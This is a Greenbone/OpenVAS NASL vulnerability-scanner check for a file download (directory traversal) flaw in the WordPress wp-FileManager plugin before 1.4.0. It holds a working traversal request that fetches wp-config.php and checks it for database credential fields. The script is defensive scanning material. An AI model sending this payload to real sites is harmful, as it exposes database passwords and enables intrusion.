# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803492");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-04-17 17:30:46 +0530 (Wed, 17 Apr 2013)");
  script_name("WordPress wp-FileManager Plugin File Download Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25440");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/53421");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wp-filemanager/changelog");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wordpress-wp-filemanager-file-download");
  script_xref(name:"URL", value:"http://security4you.net/blog/wordpress-wp-filemanager-local-file-download-vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to download and
  read arbitrary files on the affected application.");
  script_tag(name:"affected", value:"WordPress wp-FileManager Plugin before 1.4.0");
  script_tag(name:"insight", value:"The input passed via 'path' parameter to
  'wordpress/wp-content/plugins/wp-filemanager/incl/libfile.php' script is
  not properly validating '../'(dot dot) sequences before being returned
  to the user.");
  script_tag(name:"solution", value:"Update to version 1.4.0 or later.");
  script_tag(name:"summary", value:"The WordPress plugin 'wp-FileManager' is prone to file download vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/wp-filemanager/incl/libfile.php' +
            '?&path=../../&filename=wp-config.php&action=download';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"wp-config.php}",
                   extra_check:make_list('DB_NAME', 'DB_USER', 'DB_PASSWORD')))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
